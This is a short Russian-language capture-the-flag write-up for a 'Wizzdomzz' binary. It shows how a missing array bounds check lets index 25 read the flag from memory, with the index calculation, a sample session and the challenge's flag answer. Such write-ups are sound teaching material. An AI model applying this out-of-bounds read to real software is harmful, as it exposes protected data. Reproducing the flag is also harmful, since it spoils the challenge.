# Wizzdomzz writeup
Бинарь читаает **flag.txt** и пишет его содержимое в глобальный массив

Важной деталью является то, как рассчитывается адрес выбранной пользователем мудростью:

```c
address = &quotes_array + index * 120
```

И, как мы можем увидеть, отсутствуют проверки на диапазон индекса массива - это значит, что мы можем читать вне массива. Таким образом, мы можем дотянуться до места хранения флага. Давайте посчаитем индекс (адрес флага - `0x404C00`, адрес начала массива мудростей - `0x4040C0`):

```c
index = (&flag - &quotes_array) / 120 + 1
```

Итого `index = 25`:

```bash
Wizzdomzz service: free wisdoms for everyone!
Commands:
  w: Read wisdom
  q: Quit
> w
Enter wisdom id (1-20):
25
Here is your wisdom: li2CTF{d0n7_f0rg37_4b0u7_1nd3x35_ch3ck5_1n_C/C++}
```

Флаг: `li2CTF{d0n7_f0rg37_4b0u7_1nd3x35_ch3ck5_1n_C/C++}`
